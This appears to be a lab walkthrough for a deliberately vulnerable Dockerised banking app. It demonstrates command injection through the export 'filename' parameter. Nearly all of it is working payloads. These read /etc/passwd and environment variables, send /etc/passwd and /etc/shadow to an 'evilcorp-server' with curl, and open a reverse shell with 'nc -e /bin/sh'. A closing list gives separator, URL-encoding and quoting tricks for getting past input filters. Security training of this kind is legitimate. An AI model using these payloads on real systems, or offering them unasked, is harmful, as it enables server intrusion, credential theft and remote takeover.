
# ============================================================================
# Command Injection
# ATTACK EXAMPLES & TESTING ENDPOINTS
# ============================================================================

## Environment Setup

Before starting, ensure you have:
- Banking-app container running
- Evilcorp-server container running
- Three terminal windows available

### Prepare for monitoring
1. On one terminal run `docker exec -it banking-app sh` This gives you terminal access to the banking-app server.
2. On another terminal run `docker exec -it evilcorp-server sh` This gives you terminal access to the evilcorp hacker server.

### The injection
1. Navigate to the export functionality (`http://127.0.0.1:5000/export`)

User input from the `filename` parameter is directly inserted into a shell command without sanitization.

**Test simple command execution:**
```
Filename: transactions; ls -la
```

**Read system files:**
```
Filename: transactions; cat /etc/passwd > /tmp/users.txt
```

**List environment variables:**
```
Filename: transactions; env > /tmp/environment.txt
```

**Verify file creation (Terminal 2):**
```bash
docker exec -it banking-app bash
cat  /tmp/users.txt
cat /tmp/environment.txt
```

### Data Exfiltration via HTTP

**Send system password file to malicious server:**
```
Filename: transactions; curl -X POST http://evilcorp-server:8888/ --data @/etc/passwd
```

**Send multiple files:**
```
Filename: transactions; tar -czf /tmp/sensitive.tar.gz /etc/passwd /etc/shadow /etc/hosts && curl -X POST http://evilcorp-server:8888/ --data-binary @/tmp/sensitive.tar.gz
```

**Check stolen data (Terminal 3):**
```bash
docker exec -it evilcorp-server sh
cd /app/stolen_data
ls -la
cat http_*.txt
```

### Reverse Shell Tests

**Set up listener on evilcorp-server (Terminal 3):**
```bash
docker exec -it evilcorp-server sh
nc -lvp 6666
```

**Establish reverse shell connection:**
```
Filename: transactions; nc -e /bin/sh evilcorp-server 6666
```

**Test interactive access (on evilcorp-server terminal):**
- `ls`
- `whoami`
- `pwd`
- `cat /etc/passwd`


### Bypassing Input Filters

**Using different command separators:**
```
transactions|whoami
transactions||whoami
transactions&&whoami
transactions`whoami`
transactions$(whoami)
```

**URL encoding:**
```
transactions%3Bwhoami
```

**Quote manipulation:**
```
transactions';'whoami
transactions";"whoami
```


